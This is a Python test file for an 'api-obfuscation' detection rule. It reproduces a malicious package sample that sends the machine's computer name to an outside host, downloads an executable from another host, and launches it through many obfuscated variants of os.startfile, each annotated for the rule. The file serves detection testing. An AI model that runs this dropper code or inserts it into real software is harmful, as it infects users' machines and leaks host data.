""" Tests for api-obfuscation rule

    RULEID cases:
      - obfuscated version of 1337c package
"""
import os
import requests
from sys import platform
import base64

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get("https://linkedopports.com/pyp/resp.php?live=Installation " +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            
            # os.system('start '+filename)
            # ruleid: api-obfuscation
            os.__dict__['startfile']('start '+filename)
            # Variations based on string obfuscation:
            # ruleid: api-obfuscation
            os.__dict__['start' + 'file']('start '+filename)  # string concatenation
            func = 'startfile'
            # ruleid: api-obfuscation
            os.__dict__[func]()  # pass string via variable
            # ruleid: api-obfuscation
            os.__dict__[base64.b64decode('c3RhcnRmaWxl').decode('utf-8')]('start '+filename)  # base64 encoding
            # ruleid: api-obfuscation
            os.__dict__[bytes.fromhex('737461727466696c65').decode('utf-8')]('start '+filename)  # hex encoding
            # ruleid: api-obfuscation
            os.__dict__["\x67\x65\x74\x63\x77\x64"]()  # hex encoding

            # ruleid: api-obfuscation
            os.__dict__['startfile'].__call__('start '+filename)
            # ruleid: api-obfuscation
            os.__getattribute__('startfile')('start '+filename)

            # ruleid: api-obfuscation
            os.__getattribute__('startfile').__call__('start '+filename)

            # ruleid: api-obfuscation
            getattr(os, 'startfile')('start '+filename)

            # ruleid: api-obfuscation
            getattr(os, 'startfile').__call__('start '+filename)

            # ruleid: api-obfuscation
            __import__('os').startfile('start '+filename)

            # ruleid: api-obfuscation
            __import__('os').startfile.__call__('start '+filename)

            # ruleid: api-obfuscation
            __import__('os').__dict__['startfile']('start '+filename)

            # ruleid: api-obfuscation
            __import__('os').__dict__['startfile'].__call__('start '+filename)

            # ruleid: api-obfuscation
            __import__('os').__getattribute__('startfile')('start '+filename)

            # ruleid: api-obfuscation
            __import__('os').__getattribute__('startfile').__call__('start '+filename)

            # ruleid: api-obfuscation
            getattr(__import__('os'), 'startfile')('start '+filename)

            # ruleid: api-obfuscation
            getattr(__import__('os'), 'startfile').__call__('start '+filename)
    except:
        pass    
